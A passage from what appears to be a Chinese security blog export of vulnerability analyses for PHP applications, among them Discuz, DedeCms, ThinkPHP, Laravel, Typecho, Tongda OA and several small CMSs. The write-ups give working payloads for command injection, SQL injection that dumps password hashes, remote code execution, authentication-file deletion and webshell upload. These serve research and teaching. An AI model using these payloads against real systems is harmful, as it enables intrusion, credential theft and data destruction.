上面分析了/upload/source/admincp/admincp_db.php有可以利用的地方，那么就要寻找哪里调用了这个文件；在/upload/source/class/discuz/discuz_admincp.php中，只要将$action参数设为db，就实现了admincp_db.php的调用；[5] 接着寻找哪里调用了admincpfile()函数，找到/upload/admin.php；[6] 漏洞复现回到admincp_db.php，看一下参数需要满足的条件；在这一部分代码中，需要满足$operation == &#39;export&#39;，存在exportsubmit字段，$_GET[&#39;type&#39;] == &#39;custom&#39;，$_GET[&#39;setup&#39;]不为空；[7] 在这一部分代码中，需要满足$_GET[&#39;method&#39;] != &#39;multivol&#39;；[8] 接下来抓个包看看；登录后台，到数据库备份界面，选中如图内容，其余默认；[9][10] 使用burpsuite抓包；[11] 这里只需要向customtables参数中添加恶意代码，&quot;&gt;aaa; echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; phpinfo.php#，将&lt;?php phpinfo(); ?&gt;写入phpinfo.php文件中，并且用#将后面的内容注释掉；[12] 成功写入；[13] 参考链接："},{"title":"DedeCms v5.6-GBK 二次漏洞分析","date":"2022-09-18T07:29:30.000Z","url":"/2022/09/18/DedeCms%20v5.6-GBK%20%E4%BA%8C%E6%AC%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"环境搭建DedeCms v5.6-GBK源码下载地址： 访问/uploads/install进行安装；[1] 漏洞分析漏洞点在/uploads/plus/feedback.php；[2] 这个文件对应网站上文档评论区，当$comtype == &#39;comments&#39;时，也就是对文档进行评论操作时，会将$title参数使用addslashes()函数进行转义，然后赋给$arctitle；然后$msg参数不为空，就可以向数据库中进行插入操作，也会将$arctitle参数写入，所以可以利用$title进行注入；$title参数可以通过POST传入，限定了最大长度为60；[3] 当$comtype == &#39;reply&#39;时，对应网站中引用评论操作，引用后将arctitle也就是前面经过转义的$title赋给$arctitle，再重新写入数据库；[4] 评论时如果$title传入的是11&#39;，经过addslashes()函数转义后赋给$arctitle的值为11\\&#39;，插入数据库保存的值为11&#39;；引用评论时将数据库中保存的$arctitle读出，值为11&#39;，重新插入数据库没有再经过转义。 漏洞复现随便用一个账号发表一篇文档；[5] 在评论区发表评论抓包，在post的参数后面添加&amp;title=xx&#39;,(char(@‘)),/*[6] 进入评论列表，点击刚刚发表的评论的“引用”；[7] 在这里发表评论，然后抓包；[8] 修改postmsg的参数内容为sql查询语句，空格用/**/代替；&amp;msg=*/1,2,3,4,5,6,7,(select/**/concat(userid,0x3a,pwd)/**/from/**/007_member/**/limit/**/1))%23[9] 放包后查看评论列表，出现我们sql查询的信息；[10] 参考链接："},{"title":"ThinkPHP 5.0.x 缓存RCE","date":"2022-09-18T07:28:30.000Z","url":"/2022/09/18/ThinkPHP%205.0.x%20%E7%BC%93%E5%AD%98RCE/","categories":[[" ",""]],"content":"环境搭建5.0.10源码下载地址： 入口在/public/index.php；[1] 影响版本5.0.0~5.0.10 漏洞复现漏洞代码application\\index\\controller\\Index.php：[2] payload：?username=echod&quot;%0Aeval($_GET[1]);//[3] 在runtime目录下生成了一个cache目录，下面生成了缓存文件；[4] 利用：[5] 漏洞分析thinkphp&#x2F;library&#x2F;think&#x2F;Cache.php首先跟进set方法；[6] 再跟进init方法，self::$handler值为null，$options为空，所以进入else分支；[7] 进入get然后进入connect方法，$type为File，$name为false，所以将$options进行反序列化，再进行md5加密处理，最后$class为\\think\\cache\\driver\\File；[8] 通过init方法调用了\\think\\cache\\driver\\File.php中的set方法；[9] 跟进getCacheKey方法，将$name进行md5加密，取前两个字符作为缓存子目录名称，后30个字符作为缓存文件名；[10] 返回set方法，$data为echod&quot;%0Aeval($_GET[1]);//序列化后的值，并没有对传入的参数做其他检测过滤处理；然后拼接php标签，添加了//注释符，可以通过在payload中添加换行符进行绕过，最后成功写入缓存；[11] 命令执行；[12] 参考链接："},{"title":"thinkphp 5.0 method任意调用方法导致RCE","date":"2022-09-18T07:27:30.000Z","url":"/2022/09/18/thinkphp%205.0%20method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4RCE/","categories":[[" ",""]],"content":"环境搭建thinkphp v5.0.22源码下载地址： 入口在/public/index.php；[1] 影响版本5.0.0~5.0.23 漏洞描述ThinkPHP5.0在核心代码中实现了表单请求类型伪装的功能，该功能利用$_POST[&#39;_method&#39;]变量来传递真实的请求方法，当攻击者设置$_POST[&#39;_method&#39;]=__construct时，Request类的method方法便会将该类的变量进行覆盖，攻击者利用该方式将filter变量覆盖为system等函数名，当内部进行参数过滤时便会进行执行任意命令。 方法1payload [1-1] 漏洞分析&#x2F;public&#x2F;index.php从入口文件下手，加载的框架引导文件在start.php；[2] &#x2F;thinkphp&#x2F;start.php跟踪到start.php，执行应用调用的是App类；[3] thinkphp&#x2F;library&#x2F;think&#x2F;App.php跟踪到App.php， 从run方法开始；跟踪到路由检测部分，调用了routeCheck()方法，通过Request::instance()实例化了一个$request对象传给routeCheck()方法；[4] 跟踪到该方法，路由检测部分又调用了check()方法；[5] thinkphp&#x2F;library&#x2F;think&#x2F;Route.php跟踪check()方法，其中又调用了method()方法，$rules会根据$method的不同获取不同的路由规则；[6] thinkphp&#x2F;library&#x2F;think&#x2F;Request.php跟踪method()方法；[7] $method默认为false，进入elseif分支，只要POST一个_method参数，就可进入子分支if，Config::get(&#39;var_method&#39;)可以造成该类的任意方法调用；给_method传入__construct，则会调用__construct方法；跟踪__construct方法[8] 利用foreach循环，POST传入数组即可对Request对象的成员属性进行覆盖，可以给filter[]变量传入system等危险函数；payload请求的路由是?captcha，它对应的注册规则为\\think\\Route::get（&#x2F;vendor&#x2F;topthink&#x2F;think-captcha&#x2F;src&#x2F;helper.php）[9] 需要让method()方法中$this-&gt;method返回为get，所以在payload中传入method=get，然后在将值传给check()方法中的$rules； 回到run()方法，继续跟踪，到139行，调用了exec()方法；[10] 跟踪exec()，用switch-case语句匹配$dispatch类型，经过我们前面的传参，这里$dispatch是method回调方法；[11] 进入method分支，跟踪param()方法；[12] 652行将当前请求参数和url地址中的参数合并，payload中给get传入了whoami；然后进入input()方法；[13] 此时$name为false，返回$data；回到param()方法，然后又进入input()方法，跟到1023行，过滤器通过getFilter()方法获得，payload中我们传入的filter参数为system；接着判断$data为数组，进入if条件分支，array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter)对$data数组中的每一个值调用filterValue()方法；跟进filterValue()方法；[14] 出现call_user_func函数，两个参数都是可控的，$filter为system，$value是$this-&gt;param传到$data的whoami；[14-1] 成功命令执行；[14-2] 方法2payload [15] 漏洞分析回到param()方法，这里$method赋为true；[16] 从这里跟进method()方法，第一个if判断就为真；[17] 跟进server()方法，这里也调用了input()方法；[18] 此时input()中的$data对应$this-&gt;server，$name的值为 REQUEST_METHOD，因此可传入server[REQUEST_METHOD]=whoami；[18-1] $filter还是传入system；这里$data就不是数组了，直接进入filterValue()方法；[19] 调用call_user_func执行命令；[20] 参考链接："},{"title":"ThinkPHP 5.0.x 5.1.x 未开启强制路由导致RCE","date":"2022-09-18T07:26:30.000Z","url":"/2022/09/18/ThinkPHP%205.0.x%205.1.x%20%E6%9C%AA%E5%BC%80%E5%90%AF%E5%BC%BA%E5%88%B6%E8%B7%AF%E7%94%B1%E5%AF%BC%E8%87%B4RCE/","categories":[[" ",""]],"content":"环境搭建源码就用5.0.22版本的，上上篇文章有下载链接； 入口在/public/index.php；[1] 影响版本5.0.7~5.0.225.1.0~5.1.30 漏洞复现payload：?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1[2] payload5.0.x: 5.1.x: 漏洞分析&#x2F;application&#x2F;config.phpThinkPHP默认情况下没有开启强制路由，默认开启了路由兼容模式；[3] &#x2F;public&#x2F;index.php在入口文件下断点；[4] thinkphp&#x2F;library&#x2F;think&#x2F;App.php跟踪到run方法；跟踪到路由检测部分，调用了routeCheck方法，通过Request::instance()实例化了一个$request对象传给routeCheck方法；[5] 跟进routeCheck方法；[6] $path通过path方法获取，跟进path方法；[7] $pathinfo通过pathinfo方法获取，跟进pathinfo方法；最后返回的$this-&gt;pathinfo为payload传入的index/\\think\\app/invokefunction[8] 回到path方法，$ths-&gt;path返回的也是index/\\think\\app/invokefunction；[9] 回到routeCheck方法，继续跟进，调用了check方法，该方法返回值为false，即$result=false；644行检测了是否开启了强制路由，返回值也是false；[10] 接着if (false === $result)判断为真，跟进parseUrl方法；1225行，将$url中的/替换成了|；[11] 接着跟进parseUrlPath方法，又把|换回了/，在1297行将$url按/分为数组保存在$path中；[12] 回到parseUrl方法，1230行、1256行、1259行分别将$path中的内容存到了$moudle、$controller、$action中；[13] 然后返回如图内容到routeCheck方法中的$result；[14] 接着有返回$result到run方法；[15] 当前$dispath值如图：[16] 继续跟进到exec方法，进入moudle分支；[17] 跟进moudle方法， 接着再跟进invokeMethod方法；[18] 跟进bindParams方法，373行获取到payload中的剩下几个参数保存到$vars；[19] 通过foreach循环将传入的危险函数逐个存到$args中，返回到invokeMethod方法；[20] 通过反射方式调用invokeFunction方法；[21] 最后回到exec方法，命令执行成功；[22]"},{"title":"ThinkPHP 2.x 任意代码执行漏洞","date":"2022-09-18T07:25:30.000Z","url":"/2022/09/18/ThinkPHP%202.x%20%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","categories":[[" ",""]],"content":"环境搭建以ThinkPHP 2.1版本为例，下载地址： 需要自己在根目录下写一个入口文件index.php，可参照《ThinkPHP2.1完全开发手册》 网站访问就是这个样子；[1] 漏洞分析漏洞点在/ThinkPHP/Lib/Think/Util/Dispatcher.class.php的static public function dispatch()函数；[2] 主要就在于第102行代码，使用了preg_replace的/e模式匹配路由；preg_replace函数的作用是执行一个正则表达式的搜索和替换；preg_replace(&#39;正则表达式&#39;,&#39;替换字符&#39;,&#39;目标字符&#39;) 如果正则表达式中使用了/e修饰，则将匹配到的替换字符串当作命令来执行；举个例子： 输出结果；[3] 可以看到没有用/e修饰的正则表达式仅仅将print(&quot;blckder02&quot;);当作字符串输出，而添加了/e的正则表达式，则是将print(&quot;blckder02&quot;);当作命令来执行了； 漏洞代码中的preg_replace函数使用/e字符修饰，所以如果替换字符的位置是一个可执行的命令，则可实现命令执行； 漏洞代码中的替换字符为&#39;$var[\\&#39;\\\\1\\&#39;]=&quot;\\\\2&quot;;&#39;，是一个对数组的操作，$var是一个数组，\\&#39;\\\\1\\&#39;也就是\\1，&quot;\\\\2&quot;就是\\2；在正则匹配中，将匹配到的字符存入一个临时缓冲区中，并从左到有出现的顺序排序，编号从1开始，\\1就是访问匹配到的第一个字符，\\2就是匹配访问到的第二个字符，那么&#39;$var[\\&#39;\\\\1\\&#39;]=&quot;\\\\2&quot;;&#39;就表示将下标为”\\1“键的值赋为”\\2“； preg_replace函数中的目标字符为implode($depr,$paths)，$paths是可控的，由路径获取；[4] 默认的URL访问是PATHINFO模式，也就是路径以/的形式，即$depr为/；[5] 那么漏洞代码中的正则表达式就可以替换为@(\\w+)\\/([^\\/\\/]+)/@e，这个表达式的意思是匹配路径的每两个参数；举个例子： 输出结果：[6] 可以看到，如果目标字符中存在可执行命令，并且该命令的匹配的每第二个参数，也就是键值对值的位置，则该命令可被执行； 那么，构造路径为/index/index/xxx/$&#123;@phpinfo()&#125;； 构造/Index/index是为了将URL映射到IndexAction模块下，而index操作其实就是IndexAction类的一个公共方法；xxx只是为了占位，随便什么内容都可以，$&#123;@phpinfo()&#125;则是要执行的命令； 漏洞复现[7] 参考链接："},{"title":"Laravel-5.8反序列化RCE分析","date":"2022-09-18T07:24:30.000Z","url":"/2022/09/18/Laravel-5.8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"环境搭建PHP环境大家应该都有，还要安装composer；下载地址：下载安装好后，执行composer --version可以查看到安装版本；[1] 下载Laravel 5.8版本：命令行进入该目录，执行composer install，等待安装完成；[2] 安装完成后Laravel目录下会多出一个vendor文件夹；将config目录下的app.php的&#39;debug&#39; =&gt; env(&#39;APP_DEBUG&#39;, false)中的false改为true；复制.env.example文件，重新保存为.env；[3]命令行执行php artisan key:generate，.env文件中会生成app_key；[4] 一系列操作完成后就可以访问主页啦；[5] 在/app/Http/Controllers下添加一个DemoController控制器；DemoController.php： 在/routes/web.php中添加一条路由，将原来的路由注释掉；Route::get(&quot;/&quot;,&quot;\\App\\Http\\Controllers\\DemoController@demo&quot;);[6] 再次访问/public就是自定义的界面了；[7] 漏洞分析寻找__destruct方法，定位到vendor&#x2F;laravel&#x2F;framework&#x2F;src&#x2F;Illuminate&#x2F;Broadcasting&#x2F;PendingBroadcast.php[8] events和event都是可控的，通过控制events参数可以调用任意类的dispath()方法，搜索跟踪到vendor&#x2F;laravel&#x2F;framework&#x2F;src&#x2F;Illuminate&#x2F;Bus&#x2F;Dispatcher.php[9] 如果满足if的条件，就调用dispatchToQueue()方法，跟踪该方法[10] 存在call_user_func函数，而$this-&gt;queueResolver是可控的；[11] 那么只需要通过dispatch()中if的判断，就可以进行到这一步，使用call_user_func函数执行命令；$this-&gt;queueResolver是可控的，所以if的第一个判断满足，来看看第二个，跟踪commandShouldBeQueued()方法[12] 只要return为真，第二个判断也就满足了；只需要$command，即$this-&gt;event是一个继承于ShouldQueue接口的类，搜索出来挺多的，就用BroadcastEvent类吧[13] 思路总结 PendingBroadcast.php中的__destruct()方法，events和event可控 Dispatcher.php，逐步跟踪dispatch()方法，存在call_user_func函数，想办法利用 让$this-&gt;event为一个继承于ShouldQueue接口的类，queueResolver为执行命令的函数名，connection为要执行的命令 POC编写 漏洞复现虽然有报错，但是命令已经执行了；[14] 参考链接："},{"title":"Laravel-5.7反序列化RCE分析","date":"2022-09-18T07:23:30.000Z","url":"/2022/09/18/Laravel-5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"环境搭建参照上一文《Laravel-5.8反序列化RCE分析》 漏洞分析寻找__destruct()方法，定位到vendor&#x2F;laravel&#x2F;framework&#x2F;src&#x2F;Illuminate&#x2F;Foundatio&#x2F;Testing&#x2F;PendingCommand.php[1] 这里判断hasExecuted是否为true，是就return，不是就调用run()方法，这里hasExecuted默认为false；[2] 跟踪run()方法到[3] 调用了mockConsoleOutput()方法，该方法主要用于模拟应用程序的控制台输出，跟踪到[4] 调用了createABufferedOutputMock()方法，跟踪到[5] 这里也调用了Mockery类的mock方法，代码继续执行，到foreach中，要对$this-&gt;test类的expectedOutput属性进行遍历，可是在可以实例化的类中不存在expectedOutput属性，只存在于一些测试类中，然而访问一个不存在的属性时，就会触发__get()方法，跟踪到Illuminate\\Auth\\GenericUser[6] attributes是可控的[7] 因此可以构造$this-&gt;attributes键名为expectedOutput的数组,这样一来$this-&gt;test-&gt;expectedOutput就会返回$this-&gt;attributes中键名为expectedOutput的数组，$this-&gt;createABufferedOutputMock()的代码也就顺利执行了；走通之后又回到mockConsoleOutput()方法，进入foreach，和前面一样的操作，在$this-&gt;attributes中定义键名为expectedQuestions的数组即可，顺利走出； 回到run()方法，继续分析，漏洞产生的关键点，出现了call方法的调用；[8] Kernel::class在这里是一个固定值Illuminate\\Contracts\\Console\\Kernel，$this-&gt;command是要执行命令的函数，this-&gt;parameters是命令内容；跟踪得到getConcrete的调用栈：Illuminate\\Container\\Container.php[9] 704行判断$this-&gt;bindings[$abstract]是否存在，若存在则返回$this-&gt;bindings[$abstract][&#39;concrete&#39;]；$bindings是Illuminate/Container/Container.php文件中Container类中的属性。因此只要寻找一个继承自Container的类，即可通过反序列化控制$this-&gt;bindings属性；而Illuminate\\Foundation\\Application恰好继承自Container类，这就是为什么选择Illuminate\\Foundation\\Application对象放入$this-&gt;app的原因；$abstract变量为固定值Illuminate\\Contracts\\Console\\Kernel，所以我们只需通过反序列化定义Illuminate\\Foundation\\Application的$bindings属性为二维数组就能进入该分支语句，键$abstract作为数组，存在键名为concrete，返回我们要实例化的类名，即Illuminate\\Foundation\\Application类；resolve方法调用了getConcrete：[10] 接下来进入if判断，调用了$this-&gt;isBuildable，判断是否能实例化，跟踪到：[11] 此时$concrete为Application，而$abstract为kernal，显然不相等，并且||右边$concrete明显不是闭包类的实例化，所以此时不满足Application实例化条件，所以判断为假，调用make方法：[12] 又循环一遍resolve方法，调用getConcrete方法的时侯，已经可以成功实例化Application类，所以再判断$this-&gt;isBuildable的时候，$concrete === $abstract条件成立，结果为真，进入build方法：[13] 使用了ReflectionClass反射机制，实例化我们传入的类，最后逐层返回我们创建的对象，即创建的Illuminate\\Foundation\\Application类的对象； 回到run()方法，接下来是调用Application类中的call方法，即父类Container中的call方法，跟踪到：[14] 又继续跟进BoundMethod类的call方法：Illuminate\\Container\\BoundMethod.php[15] 进入if，调用isCallableWithAtSign，判断回调函数是否为数组并且是否含有@符号，而$defaultMethod默认为null，所以判断为假；[16] 看后面的return，callBoundMethod只是判断callback是否为数组；后面使用了call_user_func_array函数，$callback可控，跟进一下getMethodDependencies：[17] 最后使用array_merge函数将$dependencies数组和$parameters数组进行合并，但是$dependencies数组为空，因此对我们要执行命令的参数不产生影响，所以执行的代码为：call_user_func_array(&#39;system&#39;,array(&#39;whoami&#39;))run函数中$exitcode值即为命令的执行结果；[18] POC 参考链接："},{"title":"Typecho反序列化漏洞分析","date":"2022-09-18T07:22:30.000Z","url":"/2022/09/18/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"环境搭建源码下载地址：访问/admin/进行安装； 漏洞简介install.php存在反序列化漏洞可执行任意命令实现前台getshell。 影响范围2017年10月24日之前的所有版本 漏洞分析程序运行到这里需要两个条件： $_GET[‘finish’]参数不为空； Referer必须是本站[0] install.php[1] 230行调用了Typecho_Cookie类的get()方法，跟踪到&#x2F;var&#x2F;Typecho&#x2F;Cookie.php[2] 这个方法表示_typecho_config参数可以用$_COOKIE传入，也可以用$_POST传入，是可控的；继续看install.php，反序列化_typecho_config后，232行又实例化了Typecho_Db类，跟踪到&#x2F;var&#x2F;Typecho&#x2F;Db.php构造函数：[3] 其中第120行，对传入的$adaterName参数进行了字符串拼接； $adaterName是可控的，根据PHP魔术方法的规则，如果给它传入一个类，就会自动触发_toString()方法；全局搜索一下_toString()方法，最后定位到&#x2F;var&#x2F;Typecho&#x2F;Feed.php [4] 访问了$item[&#39;author&#39;]-&gt;screenName，$item[&#39;author&#39;是可控的，如果给它设置一个不可访问的属性，就会触发_get()方法，跟踪到&#x2F;var&#x2F;Typecho&#x2F;Request.php [5] 继续追踪；[6] $value的值是通过_parmas获得，而_parmas是可控的，从而$value也是可控的，并且判断了$value是否为数组，且长度大于0；继续跟进_applyFilter()到[7] array_map和call_user_func函数都能执行代码，前面判断了$value不为数组，所以用call_user_func，里面两个参数都是可控的，所以可以执行任意命令； 总结思路 install.php中的$config参数可控 给$config[&#39;adapter&#39;]传入类，Db.php中字符串与可控类拼接触发_toString()方法 跟踪_toString()方法到Feed.php，$item[&#39;author&#39;]可控，令它为一个不可访问的属性，触发_get()方法 Request.php中_applyFilter()方法，call_user_func函数里的参数都可控，可执行任意代码 POC编写搬运刘师傅的POC： 漏洞复现GET传入?finish=1，POST传入__typecho_config为POC的运行结果；[8] 即可成功写入shell.php；[9] 参考链接："},{"title":"通达OA未授权文件上传&任意文件包含导致RCE分析","date":"2022-09-18T07:21:30.000Z","url":"/2022/09/18/%E9%80%9A%E8%BE%BEOA%E6%9C%AA%E6%8E%88%E6%9D%83%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0&%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AF%BC%E8%87%B4RCE%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"影响版本 V11.3版 2017版 2016版 2015版 2013版 2013增强版 未授权访问文件上传代码分析 &#x2F;ispirit&#x2F;im&#x2F;upload.php 4-14行： 如果不传入参数P，就要包含auth.php显示用户未登录，所以只需传入一个P值就可以避免，但还有后续验证；[1] 23-41行： 判断DEST_UID是否为空；如果DEST_UID中含有,，则取整；如果DEST_UID的值为1，则UPLOAD_MODE就必须为2，否则显示接收方ID无效； 43-52行： 当1 &lt;= count($_FILES)，也就是又文件上传的时候，上传的参数名为ATTACHMENT，将文件名进行了一次URL解码，然后使用upload()进行上传； &#x2F;inc&#x2F;utility_file.php 1692-1694行： 调用了is_uploadable，跟踪到2299-2312行： 校验文件后缀名，通过strrpos函数获取.最后一次出现的位置，再用substr函数获取.后面的三个字符，判断是否为php；一个简单的黑名单验证，可以使用.phtml cpt等进行绕过； 漏洞复现构造一个上传页面，将P UPLOAD_MODE UPLOAD_MODE的值都赋为1； 上传一个后缀名为.phtml的shell，通过搜索可以找到上传路径位于attach/im/2101[2] 由于通达OA开启了disable_funcation，所以exec、eval、system等函数都被禁用了，用了网上一个师傅的shell： 任意文件包含代码分析&#x2F;ispirit&#x2F;interface&#x2F;gateway.php 23-52行： 用foreach对$json参数进行循坏解析，如果$key等于字符串url，则$url就等于$key所对应的值；如果$url非空，并且值中含有general/或ispirit/或module/时，就会对$url进行包含；结合文件上传，通过目录跳转，给url传入之前上传的shell路径，就可以成功包含； 漏洞复现构造payload：?json=&#123;&quot;url&quot;:&quot;../../ispirit/../../attach/im/2101/1025330629.shell.phtml&quot;&#125;&amp;cmd=whoami成功执行命令：[3] 参考链接："},{"title":"通达OA任意文件删除&文件上传RCE分析","date":"2022-09-18T07:20:30.000Z","url":"/2022/09/18/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4&%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0RCE%E5%88%86%E6%9E%90/","categories":[[" ",""]],"content":"环境搭建V11.6源码下载地址：下载安装好后，用SeayDzend解密； 影响版本通达OA V11.6 任意文件删除代码分析&#x2F;module&#x2F;appbuilder&#x2F;assets&#x2F;print.php[1] GET传入参数guid获取文件名，判断该文件是否存在，若存在就读取该文件进行反序列化，然后删除；这里可以用目录穿越进实现任意文件删除； 漏洞复现构造payload：?guid=../../../webroot/inc/auth.inc.php删除掉auth.inc.php，以免后续身份验证；[2] 未授权访问任意文件上传代码分析&#x2F;general&#x2F;data_center&#x2F;utils&#x2F;upload.php第三行包含了auth.inc.php进行身份验证，前面已经删除了，直接进行后续操作；[3] 要满足$action等于upload才能进行文件上传操作；[4] 这里对$filetype进行了两种判断，一种xls，一种img；判断了类型后再判断该文件是否存在，不存在的话新建该文件；如果直接上传的话这两种类型的话，是上传到当前目录，访问结果是403；[5] 所以要用到第三种情况else，传入其他类型的$filetype；[6][7] 多了一个$repkid参数拼在上传的文件前面，所以就可以用这个参数来进行目录穿越，穿越到可以访问的目录下；这里不需要传入$from_rep，直接进入84行的else：[8] 漏洞复现传入的文件名为FILE，给$repkid传入../../../跳转到webroot目录下；构造上传页面： [9] 成功执行命令：[10] 参考链接："},{"title":"YCCMS代码审计","date":"2022-09-18T07:19:30.000Z","url":"/2022/09/18/YCCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","categories":[[" ",""]],"content":"环境搭建CMS下载地址：在/config/config.inc.php中，将数据库名称、数据库用户名、数据库密码填好；然后将yccms.sql文件导入数据库中； [1] 审计准备查看网站目录结构[2] Seay源代码审计系统扫描[3] 未授权更改管理员账号密码代码分析&#x2F;controller&#x2F;AdminAction.class.php 该文件中有一个修改密码的函数update()，代码如下(20-38)： url为?a=admin&amp;m=update，只要username和password不为空，就带入editAdmin()函数，跟踪一下editAdmin()函数到/model/AdminModel.class.php，代码如下(29-39)： 这个函数的作用是生成sql语句，将前面传入的username和password拼接到sql语句中，更新数据库id=1的位置，返回结果给它的父类/model/Model.class.php的uptade函数(12-15)： 这里又调用了execute()函数，跟踪到/model/Model.class.php(43-52)： 该函数的作用是执行sql语句，更新相关数据；这一系列操作没有对输入的密码进行验证、过滤等任何措施，也没有要求输入原密码，所以可以任意修改密码； 漏洞复现在未登录的情况下，构造url/admin/?a=admin&amp;m=update，POST传修改对象的账号名称(username)、想要修改成的密码(password)，并确认一次密码(notpassword)，还要传入send，send的内容就是修改密码的url编码，Go，修改成功；[4] 任意文件删除代码分析&#x2F;controller&#x2F;PicAction.class.php(22-34)： 传入pid，将pid拼接到$_filePath中，然后删除该路径下的文件；pid参数是可控的，并且没有对pid参数进行过滤，也没有对路径进行过滤，所以可以任意传入路径和文件，导致路径穿越，造成任意文件删除； 漏洞复现在根目录下创建一个unlink.txt，进入图片管理页面，点击删除图片并抓包；[5]post传入pid[]=../unlink.txt，Go，成功删除；[6] 任意文件上传一代码分析&#x2F;controller&#x2F;CallAction.class.php(19-32)： new了一个LogoUpload类的对象，跟踪LogoUpload到/public/class/LogoUpload.class.php，看到允许上传的图片类型只能为png(66-71)： 而检验在第7行： 就只检验了Content-Type的类型，可以直接伪造； 漏洞复现进入系统设置页面，点击上传LOGO，上传一个shell的php文件；[7]抓包将Content-Type改为image/png，GO；[8]虽然出现警告但是不影响，shell已经上传成功；[9]根据爆出的路径，用菜刀连接；[10] 任意文件上传二代码分析&#x2F;controller&#x2F;CallAction.class.php(33-48)： new了一个FileUpload类的对象，跟踪到/public/class/FileUpload.class.php，看到限制上传图片类型(65-70)： 限制只能上传png、jpg、gif，并且也只是验证Content-Type的类型，可以伪造； 漏洞复现进入首页内容页面，找到图片上传的小图标，上传一个shell，因为这里是前端验证，不是png、jpg、gif后缀的都不能上传，所以先把文件后缀改成png或jpg、gif都行；[11] 上传抓包，将文件后缀改成php，Go，上传成功；[12] 用菜刀连接/yccms/uploads/20201213152001301.php，连接成功；[13] 代码执行漏洞分析&#x2F;public&#x2F;class&#x2F;Factory.class.php setAction() 方法中，调用getA()函数获取参数$_a，然后先验证受否是管理员，如果不是，则跳转登录；file_exists()函数检测传入的页面是否存在，如果不存在则跳回index页面，存在则eval()执行php代码；那我们就要想办法让file_exists()判断上传的$_a是存在的；file_exists()函数的检查功能存在一个漏洞，如果传入phpinfo();//../，拼接后就是/controller/phpinfo();//../Action.class.php，file_exists()会把/phpinfo();/当成一级目录，然后遇到/../，就返回到上一级目录，也就是/controller，最后检查的是/controller/Action.class.php是否存在，那当然存在；判断为true，进入eval()，要new一个$_a类的对象，这个类必须是存在的，不然会报错，那就用Factory()类吧，综合前面绕过file_exists()函数，最后构造的payload为：Factory();phpinfo();//../在eval中，后面的双斜杠的作用是用来注释掉../Action()，和在file_exists()函数中的作用不同； 漏洞复现传入payload，代码执行成功；[14] 参考链接："},{"title":"百家CMS v4.1.4代码审计","date":"2022-09-18T07:18:30.000Z","url":"/2022/09/18/%E7%99%BE%E5%AE%B6CMS%20v4.1.4%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","categories":[[" ",""]],"content":"环境搭建源码下载：放入PHPstudy，建一个baijiacms的数据库，访问进行安装，设置管理员用户和密码为admin、admin； 审计准备查看网站目录结构[1] Seay源代码审计系统扫描[2] 任意路径删除代码分析点进这个漏洞查看代码；[3] &#x2F;includes&#x2F;baijiacms&#x2F;common.inc.php(520-547)： 绕过$path是路径，就删除这个路径，是文件就删除这个文件；全局搜索rmdirs，发现/system/menager/class/web/database.php调用了这个函数(246-255)： 功能是删除备份文件，但是只判断是否为路径，并没有验证是什么路径，所以可以抓包修改为任意路径，从而删除任意路径下的文件； 漏洞复现再根目录下建一个test文件夹，进入后台备份与还原页面，点击删除，抓包；[4]将id的内容修改为要删除的test文件夹的路径../../test的base64编码Li4vLi4vdGVzdA==，Go，删除成功；[5] 任意文件删除代码分析&#x2F;system&#x2F;eshop&#x2F;core&#x2F;mobile&#x2F;util&#x2F;uploader.php(46-50)： 获取到$file参数，调用file_delete函数，跟踪到/includes/baijiacms/common.inc.php(695-734)： $settings[&#39;system_isnetattach&#39;]是附件设置页面中的远程附件选择，有本地、FTP、OSS，我选择的是本地；[6]直接到达最后一个else，进行if_file判断，然后执行unlink删除文件； 漏洞复现在根目录下建一个test.txt，构造url访问：成功删除；[7] 远程文件上传代码分析&#x2F;system&#x2F;public&#x2F;class&#x2F;web&#x2F;file.php(18-26)： 传入url，调用fetch_net_file_upload()函数，跟踪到/includes/baijiacms/common.inc.php(613-616)： 用pathinfo把文件路径以数组形式返回，且只返回extension，即扩展名；路径拼接年月，创建路径；随机数和扩展名拼接为文件名；将读取的文件写入拼接生成的路径下，最后，返回路径信息； 漏洞复现在远程服务器上建一个test.php，内容是&lt;?php echo &quot;&lt;?php phpinfo();&quot;;；构造url：远程IP/test.php访问获得写入的路径；[8]访问该路径，写入成功；[9] 远程命令执行代码分析&#x2F;system&#x2F;weixin&#x2F;class&#x2F;web&#x2F;setting.php(20-40)： 也是pathinfo获取扩展名，进行判断，调用file_save函数，跟踪到/includes/baijiacms/common.inc.pphp(637-655)： $settings[&#39;image_compress_openscale&#39;]即附件设置页面的是否开启图片压缩功能；[10]经过判断后，system执行上传的文件，导致RCE； 漏洞复现本地创建一个名称为命令的txt文件；[11]找到上传页面进行上传，提交；[12]执行成功；[13] 参考链接："},{"title":"熊海cms1.0代码审计","date":"2022-09-18T07:17:30.000Z","url":"/2022/09/18/%E7%86%8A%E6%B5%B7cms1.0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","categories":[[" ",""]],"content":"环境搭建下载熊海cms源码：在PHPstudy中创建一个xhcms数据库，然后访问install文件进行安装，安装成功显示如下界面；[1] 审计过程网站目录结构看一下网站目录结构，根据文件名可以大概猜到它的功能；[2] 